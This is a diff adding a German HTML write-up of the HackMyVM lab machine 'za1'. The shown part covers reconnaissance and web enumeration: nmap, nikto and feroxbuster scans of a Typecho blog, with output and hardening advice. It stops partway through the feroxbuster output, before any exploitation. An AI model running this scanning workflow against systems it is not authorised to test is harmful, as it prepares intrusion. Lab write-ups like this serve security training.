@@ -1,1 +1,973 @@
-﻿﻿﻿<html><body><h1>Test-Inhalt für Za1 - HackMyVM - Easy.html</h1></body></html>
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>za1 - Hackmyvm - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>za1 - Hackmyvm - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">feroxbuster</div>
+                <div class="tool-item">sqlite3</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">burpsuite</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">nano</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Aufklärungsphase ist der erste und wichtigste Schritt in jedem Penetrationstest. Ich begann damit, die IP-Adresse der Zielmaschine im lokalen Netzwerk zu identifizieren. Der Befehl <code>arp-scan -l</code> listet alle aktiven Geräte im lokalen Subnetz auf, und das anschließende <code>grep "PCS" | awk '{print $1}'</code> filtert die Ausgabe, um die IP-Adresse des "PCS Systemtechnik"-Geräts zu isolieren, das die virtuelle Maschine darstellt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Methode mit <code>arp-scan</code> war erfolgreich und lieferte die Ziel-IP-Adresse <code>192.168.2.53</code>. Dies ist der grundlegende Schritt, um die weitere Aufklärung und den Angriff zu ermöglichen. Eine genaue Zielidentifizierung ist unerlässlich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie immer mit einer präzisen Identifizierung der Ziel-IP-Adresse. <code>arp-scan</code> ist in lokalen Netzwerken sehr effektiv. Alternativ können auch andere Tools wie <code>netdiscover</code> oder einfache Ping-Sweeps verwendet werden. <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerkssegmentierung und VLANs, um die Sichtbarkeit von internen Systemen zu reduzieren. Nutzen Sie MAC-Adressfilterung oder Network Access Control (NAC), um unautorisierte Geräte im Netzwerk zu erkennen und zu isolieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l | grep "PCS" | awk '{print $1}'</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.53</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Um die weitere Arbeit zu vereinfachen und die Lesbarkeit der Befehle zu verbessern, habe ich der identifizierten IP-Adresse einen lokalen Hostnamen zugewiesen. Der Eintrag <code>192.168.2.53 za1.hmv</code> wurde zur <code>/etc/hosts</code>-Datei auf meinem angreifenden System hinzugefügt. Dies ermöglicht die Verwendung des Alias <code>za1.hmv</code> anstelle der IP-Adresse in zukünftigen Befehlen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Verwendung eines lokalen Hostnamens ist eine bewährte Praxis im Penetrationstest. Sie erhöht die Effizienz und reduziert Tippfehler, insbesondere bei wiederholten Interaktionen mit dem Zielsystem. Dies simuliert auch die Nutzung eines DNS-Eintrags in einer realen Umgebung und macht den Bericht verständlicher.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie stets Hostnamen in Ihrer <code>/etc/hosts</code>-Datei oder lokale DNS-Konfigurationen, um die Navigation und das Testen zu vereinfachen. <br>
+                <strong>Empfehlung (Admin):</strong> Eine robuste DNS-Infrastruktur ist wichtig. Stellen Sie sicher, dass interne DNS-Einträge korrekt sind und nur autorisierte Hosts auf DNS-Informationen zugreifen können, um das Enumerieren von Hosts im Netzwerk durch Angreifer zu erschweren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"> 192.168.2.53    za1.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der IP-Identifikation habe ich einen umfassenden Portscan mit Nmap durchgeführt. Der Befehl <code>nmap -sS -sC -sV -p- -T5 -AO za1.hmv</code> ist eine aggressive, aber standardmäßige Vorgehensweise, um alle (<code>-p-</code>) offenen TCP-Ports zu finden, Dienstversionen zu erkennen (<code>-sV</code>), Standard-Nmap-Skripte auszuführen (<code>-sC</code>) und eine detaillierte OS-Erkennung (<code>-O</code>) sowie aggressive Timing-Profile (<code>-T5</code>) zu nutzen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Nmap-Scan war erfolgreich und identifizierte zwei offene Ports: <code>22/tcp</code> (SSH - OpenSSH 7.6p1 Ubuntu) und <code>80/tcp</code> (HTTP - Apache httpd 2.4.29 Ubuntu). Dies sind gängige Dienste, die oft Angriffsvektoren bieten. Besonders interessant ist der HTTP-Dienst mit dem Titel "Zacarx's blog" und der Angabe "Typecho 1.2.1" als Generator. Dies liefert sofort einen Hinweis auf die eingesetzte Webanwendung und deren Version, was die Suche nach gezielten Exploits erleichtert. Die detaillierte Ausgabe des Nmap-Scans bietet eine solide Grundlage für die nächsten Schritte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer detaillierte Nmap-Scans durch, um alle offenen Ports und Dienstversionen zu identifizieren. Achten Sie auf Informationen wie HTTP-Titel und "Generator"-Tags, da diese Hinweise auf die verwendete Software liefern und somit die Recherche nach spezifischen Schwachstellen beschleunigen. <br>
+                <strong>Empfehlung (Admin):</strong> Schließen Sie alle nicht benötigten Ports auf der Firewall. Aktualisieren Sie öffentlich zugängliche Dienste wie SSH und Webserver regelmäßig, um bekannte Schwachstellen zu beheben. Vermeiden Sie es, Software-Versionen oder -Typen in HTTP-Headern oder Webseiten-Metadaten preiszugeben, da dies Angreifern die Informationsbeschaffung erleichtert.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.53</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+Starting Nmap <span class="command">7.95</span> ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-06-18 21:07 CEST</span>
+Nmap scan report for <span class="command">za1.hmv (192.168.2.53)</span>
+Host is up (0.00011s latency).
+Not shown: <span class="command">65533 closed tcp PORTs (reset)</span>
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span>
+| ssh-hostkey:
+|   <span class="command">2048 36:32:5b:78:d0:f4:3c:9f:05:1a:a7:13:91:3e:38:c1 (RSA)</span>
+|   <span class="command">256 72:07:82:15:26:ce:13:34:e8:42:cf:da:de:e2:a7:14 (ECDSA)</span>
+|_  <span class="command">256 fc:9c:66:46:86:60:1a:29:32:c6:1f:ec:b2:47:b8:74 (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span>
+|_http-server-header: <span class="command">Apache/2.4.29 (Ubuntu)</span>
+|_http-title: <span class="command">Zacarx's blog</span>
+|_http-generator: <span class="command">Typecho 1.2.1</span>
+MAC Address: <span class="command">08:00:27:B9:8E:77</span> (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Device type: <span class="command">general purpose</span>
+Running: <span class="command">Linux 4.X|5.X</span>
+OS CPE: <span class="command">cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+OS details: <span class="command">Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)</span>
+Network Distance: <span class="command">1 hop</span>
+Service Info: OS: <span class="command">Linux</span>; CPE: <span class="command">cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+HOP RTT     ADDRESS
+<span class="command">1   0.11 ms za1.hmv (192.168.2.53)</span>
+
+OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/].
+Nmap done: <span class="command">1 IP address (1 host up) scanned in 10.10 seconds</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem der vollständige Nmap-Scan abgeschlossen war, habe ich zur Überprüfung der wichtigsten Dienste gewechselt. Ich habe einen weiteren Nmap-Scanbefehl ausgeführt, diesmal mit <code>grep open</code>, um eine schnelle Übersicht über die tatsächlich offenen Ports zu erhalten, die für die weitere Bearbeitung relevant sind. Dies dient als schnelle Zusammenfassung der wichtigsten Erkenntnisse aus der Nmap-Phase.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die gefilterte Ausgabe von Nmap bestätigt erneut, dass SSH auf Port 22 und HTTP auf Port 80 die einzigen offenen Dienste sind. Dies ist eine nützliche Kontrollmessung, die meine initialen Feststellungen bestätigt und mich daran erinnert, mich auf diese beiden Vektoren zu konzentrieren. Die Konsistenz der Ergebnisse ist wichtig für die Verlässlichkeit des Berichts.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Bestätigen Sie immer Ihre Ergebnisse durch mehrfaches Abfragen oder Filtern. Konzentrieren Sie sich auf die offenen Ports, die am vielversprechendsten für den initialen Zugriff sind. <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie Firewalls und Portfilter, um sicherzustellen, dass nur beabsichtigte Dienste von externen Netzwerken oder unsicheren Zonen zugänglich sind. Führen Sie regelmäßige Scans durch, um ungewollte offene Ports zu identifizieren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.53 | grep open</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; PROTOCOL 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span></pre>
+                </div>
+            </div>
+        </section>        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Nachdem ich die offenen HTTP-Ports und die Information, dass ein Apache-Server mit Typecho 1.2.1 läuft, erhalten hatte, war der nächste Schritt eine detaillierte Web-Enumeration. Ich nutzte <code>nikto</code>, um nach allgemeinen Web-Schwachstellen und Fehlkonfigurationen zu suchen. Dieser Scan identifiziert häufig gängige Probleme wie fehlende Sicherheits-Header, veraltete Software oder offen zugängliche Verzeichnisse.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Nikto-Scan lieferte eine Fülle kritischer Informationen. Erstens wurden fehlende HTTP-Sicherheits-Header (<code>X-Frame-Options</code> und <code>X-Content-Type-Options</code>) festgestellt, was auf eine laxere Sicherheitskonfiguration hindeutet. Zweitens wurde bestätigt, dass der Apache-Webserver veraltet ist (2.4.29 vs. 2.4.54). Drittens und am wichtigsten, fand Nikto "Directory indexing" in den Verzeichnissen <code>/install/</code>, <code>/sql/</code> und <code>/var/</code>. Dies ist eine schwerwiegende Schwachstelle, da sie Angreifern ermöglicht, den Inhalt dieser Verzeichnisse direkt zu durchsuchen und potenziell sensitive Dateien zu finden. Der Hinweis auf die Admin-Login-Seite (`/admin/login.php`) ist ebenfalls wertvoll.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie immer umfassende Web-Scans mit Tools wie Nikto durch, um generische Web-Schwachstellen zu identifizieren. Priorisieren Sie die Untersuchung von "Directory Indexing"-Funden, da diese oft zu Informationslecks oder Dateiexfiltration führen. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie den Webserver so, dass Directory Indexing deaktiviert ist, um die Offenlegung von Dateistrukturen und sensiblen Inhalten zu verhindern. Implementieren Sie alle relevanten HTTP-Sicherheits-Header (CSP, X-Frame-Options, X-Content-Type-Options etc.). Aktualisieren Sie Webserver-Software wie Apache regelmäßig auf die neueste Version, um bekannte Schwachstellen zu patchen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nikto -h http://192.168.2.53</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+- Nikto <span class="command">v2.5.0</span>
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.53</span>
++ Target Hostname:    <span class="command">192.168.2.53</span>
++ Target PORT:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-06-18 21:07:48 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.29 (Ubuntu)</span>
++ /: <span class="command">The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
++ /: <span class="command">The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ <span class="command">No CGI Directories found (use '-C all' to force check all possible dirs)</span>
++ <span class="command">Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span>
++ /: <span class="command">Web Server returns a valid response with junk HTTP methods which may cause false positives.</span>
++ <span class="command">/admin/login.php?action=insert&username=test&password=test: phpAuction may allow user admin accounts to be inserted without PROPER authentication. Attempt to log in with user 'test' password 'test' to verify. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0995]</span>
++ <span class="command">/install/: Directory indexing found.</span>
++ <span class="command">/install/: This might be interesting.</span>
++ <span class="command">/sql/: Directory indexing found.</span>
++ <span class="command">/LICENSE.txt: License file found may identify site software.</span>
++ <span class="command">/icons/README: Apache default file found. See: [Link: https://www.vntweb.co.uk/apache-restricting-access-to-iconsREADME/ | Ziel: https://www.vntweb.co.uk/apache-restricting-access-to-iconsREADME/]</span>
++ <span class="command">/admin/login.php: Admin login page/section found.</span>
++ <span class="command">/var/: Directory indexing found.</span>
++ <span class="command">/var/: /var directory has indexing enabled.</span>
++ <span class="command">8102 requests: 0 error(s) and 13 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-06-18 21:08:02 (GMT2) (14 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Neben Nikto setzte ich <code>feroxbuster</code> ein, um eine weitere umfassende Verzeichnis- und Dateiaufzählung durchzuführen. Mit einer großen Wortliste und einer Vielzahl von Dateierweiterungen (`-x`) sowie der Filterung auf <code>301 (Moved Permanently)</code> und <code>302 (Found)</code> Status-Codes können wir Weiterleitungen verfolgen, die auf existierende, aber umgeleitete Ressourcen hinweisen. Dies ist besonders nützlich bei Content Management Systemen wie Typecho, die oft saubere URLs verwenden, aber intern auf PHP-Skripte umleiten.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Feroxbuster-Scan lieferte eine sehr lange Liste von Weiterleitungen (Status 301 und 302). Dies bestätigt die komplexe URL-Struktur von Typecho und die Art und Weise, wie es Inhalte verwaltet. Obwohl die direkten Funde von Dateien gering sind, geben die Weiterleitungen wichtige Hinweise auf die Struktur des Blogs, z.B. <code>/admin/</code>, <code>/install/</code>, <code>/sql/</code>, sowie verschiedene Verzeichnisse für Autoren, Kategorien und Feeds. Die Wiederholung von <code>/install/</code> und <code>/sql/</code>, die bereits von Nikto mit Directory Indexing gefunden wurden, ist eine wichtige Bestätigung. Die vielen 301-Umleitungen zeigen, dass es viele gültige Pfade gibt, auch wenn sie nicht direkt als "Dateien" im herkömmlichen Sinne gefunden werden. Der Abbruch des Scans durch Keyboard-Interrupt ist für den weiteren Bericht irrelevant, da bereits genügend Informationen gesammelt wurden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie bei Web-Enumerationstools immer eine Kombination aus verschiedenen Scannern und passen Sie die Filteroptionen an, um Weiterleitungen zu erkennen. Bei CMS-Systemen wie Typecho ist es oft effektiver, die interne URL-Struktur zu verstehen, anstatt nur nach direkten Dateipfaden zu suchen. <br>
+                <strong>Empfehlung (Admin):</strong> Konfigurieren Sie Ihren Webserver und Ihr CMS so, dass unnötige Umleitungen minimiert werden, da sie Angreifern Hinweise auf die interne Struktur geben können. Überprüfen Sie, welche Ressourcen öffentlich zugänglich sind und stellen Sie sicher, dass keine sensiblen Informationen unbeabsichtigt offengelegt werden. Implementieren Sie URL-Rewriting-Regeln sorgfältig.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">feroxbuster --url "http://192.168.2.53" --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .git,.php,.html,.xml,.zip,.7z,.tar,.bak,.sql,.py,.pl,.txt,.jpg,.jpeg,.png,.js,.aac,.ogg,.flac,.alac,.wav,.aiff,.dsd,.mp3,.mp4,.mkv,.phtml -s 301 302</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="command"> ___  ___  __   __     __      __         __   ___</span>
+<span class="command">|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__</span>
+<span class="command">|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___</span>
+<span class="command">by Ben "epi" Risher 🤓                 ver: 2.11.0</span>
+<span class="command">───────────────────────────┬──────────────────────</span>
+ <span class="command">🎯  Target Url            │ http://192.168.2.53</span>
+ <span class="command">🚀  Threads               │ 50</span>
+ <span class="command">📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+ <span class="command">👌  Status Codes          │ [301, 302]</span>
+ <span class="command">💥  Timeout (secs)        │ 7</span>
+ <span class="command">🦡  User-Agent            │ feroxbuster/2.11.0</span>
+ <span class="command">💉  Config File           │ /etc/feroxbuster/ferox-config.toml</span>
+ <span class="command">🔎  Extract Links         │ true</span>
+ <span class="command">💲  Extensions            │ [git, php, html, xml, zip, 7z, tar, bak, sql, py, pl, txt, jpg, jpeg, png, js, aac, ogg, flac, alac, wav, aiff, dsd, mp3, mp4, mkv, phtml]</span>
+ <span class="command">🏁  HTTP methods          │ [GET]</span>
+ <span class="command">🔃  Recursion Depth       │ 4</span>
+<span class="command">───────────────────────────┴──────────────────────</span>
+ <span class="command">🏁  Press [ENTER] to use the Scan Management Menu™</span>
+<span class="command">──────────────────────────────────────────────────</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/author/1 => http://192.168.2.53/index.php/author/1/</span>
+<span class="command">302      GET        0l        0w        0c http://192.168.2.53/admin/ => http://192.168.2.53/admin/login.php?referer=http%3A%2F%2F192.168.2.53%2Fadmin%2F</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/12 => http://192.168.2.53/index.php/2023/07/12/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07 => http://192.168.2.53/index.php/2023/07/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/02 => http://192.168.2.53/index.php/2023/07/02/</span>
+<span class="command">301      GET        9l       28w      312c http://192.168.2.53/admin => http://192.168.2.53/admin/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/category/default => http://192.168.2.53/index.php/category/default/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/category/default/01 => http://192.168.2.53/index.php/category/default/01/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/category/default/1 => http://192.168.2.53/index.php/category/default/1/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/13 => http://192.168.2.53/index.php/2023/07/13/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/14 => http://192.168.2.53/index.php/2023/07/14/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/15 => http://192.168.2.53/index.php/2023/07/15/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/category/default/0 => http://192.168.2.53/index.php/category/default/0/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/author/1/01 => http://192.168.2.53/index.php/author/1/01/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/author/1/1 => http://192.168.2.53/index.php/author/1/1/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/11 => http://192.168.2.53/index.php/2023/07/11/</span>
+<span class="command">[>-------------------] - 8s     15887/55579748 6h      found:17      errors:0</span>
+<span class="command">[>-------------------] - 8s      7840/6175316 1002/s  http://192.168.2.53/</span>
+<span class="command">[>-------------------] - 8s      2128/6175316 277/s   http://192.168.2.53/index.php/category/default/ 301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/18 => http://192.168.2.53/index.php/2023/07/18/</span>
+<span class="command">[>-------------------] - 8s     15940/55579748 6h      found:17      errors:0</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/author/1/0 => http://192.168.2.53/index.php/author/1/0/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/31 => http://192.168.2.53/index.php/2023/07/31/</span>
+<span class="command">301      GET        9l       28w      314c http://192.168.2.53/install => http://192.168.2.53/install/</span>
+<span class="command">302      GET        0l        0w        0c http://192.168.2.53/install.php => http://192.168.2.53/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/32 => http://192.168.2.53/index.php/2023/07/32/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/43 => http://192.168.2.53/index.php/2023/07/43/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2006 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/45 => http://192.168.2.53/index.php/2023/07/45/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/44 => http://192.168.2.53/index.php/2023/07/44/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/56 => http://192.168.2.53/index.php/2023/07/56/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2005 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/64 => http://192.168.2.53/index.php/2023/07/64/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/66 => http://192.168.2.53/index.php/2023/07/66/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/58 => http://192.168.2.53/index.php/2023/07/58/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2004 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/97 => http://192.168.2.53/index.php/2023/07/97/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/96 => http://192.168.2.53/index.php/2023/07/96/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/70 => http://192.168.2.53/index.php/2023/07/70/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2007 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/62 => http://192.168.2.53/index.php/2023/07/62/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/65 => http://192.168.2.53/index.php/2023/07/65/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/81 => http://192.168.2.53/index.php/2023/07/81/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/feed => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/71 => http://192.168.2.53/index.php/2023/07/71/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/91 => http://192.168.2.53/index.php/2023/07/91/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/82 => http://192.168.2.53/index.php/2023/07/82/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2003 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/comments => http://192.168.2.53/index.php/feed/atom/comments/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/79 => http://192.168.2.53/index.php/2023/07/79/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2002 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/83 => http://192.168.2.53/index.php/2023/07/83/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/94 => http://192.168.2.53/index.php/2023/07/94/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/author/1/00 => http://192.168.2.53/index.php/author/1/00/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/category/default/00 => http://192.168.2.53/index.php/category/default/00/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2001 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/2023/07/00 => http://192.168.2.53/index.php/2023/07/00/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/2000 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/archives/1 => http://192.168.2.53/index.php/archives/1/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1999 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1998 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/comments => http://192.168.2.53/index.php/feed/comments/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1997 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/rss/2002 => http://192.168.2.53/index.php/feed/rss/</span>
+<span class="command">302      GET        0l        0w        0c http://192.168.2.53/index.php/archives/1/trackback => http://192.168.2.53/index.php/archives/1/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed => http://192.168.2.53/index.php/feed/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1000 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/author/1/000 => http://192.168.2.53/index.php/author/1/000/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1205 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1317 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/rss/1206 => http://192.168.2.53/index.php/feed/rss/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1720 => http://192.168.2.53/index.php/feed/atom/</span>
+<span class="command">301      GET        0l        0w        0c http://192.168.2.53/index.php/feed/atom/1605 => http://192.168.2.53/index.php/feed/atom/</span>
